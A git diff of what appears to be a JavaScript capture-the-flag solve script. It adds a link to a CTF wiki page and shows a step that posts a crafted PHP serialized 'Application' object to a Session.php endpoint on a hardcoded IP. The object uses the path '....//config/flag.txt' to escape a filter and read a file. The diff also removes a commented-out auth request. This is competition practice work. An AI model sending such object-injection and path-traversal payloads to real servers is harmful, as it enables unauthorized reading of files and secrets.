@@ -87,6 +87,9 @@ async function step2 () {
   return message
 }
 
+/**
+ * https://ctf-wiki.github.io/ctf-wiki/web/php/php/#_14
+ */
 async function step4 () {
   const session = 'O:11:"Application":1:{s:4:"path";s:21:"....//config/flag.txt";}77cd55a8d29df4f005f85e536d876525'
   const response = await gotty.post('http://117.51.158.44/app/Session.php?', {
@@ -112,24 +115,3 @@ async function main () {
 }
 
 main()
-
-
-// function auth() {
-//   $.ajax({
-//       type: "post",
-//       url:"http://117.51.158.44/app/Auth.php",
-//       contentType: "application/json;charset=utf-8",
-//       dataType: "json",
-//       beforeSend: function (XMLHttpRequest) {
-//           XMLHttpRequest.setRequestHeader("didictf_username", "");
-//       },
-//       success: function (getdata) {
-//          console.log(getdata);
-//          if(getdata.data !== '') {
-//              document.getElementById('auth').innerHTML = getdata.data;
-//          }
-//       },error:function(error){
-//           console.log(error);
-//       }
-//   });
-// }
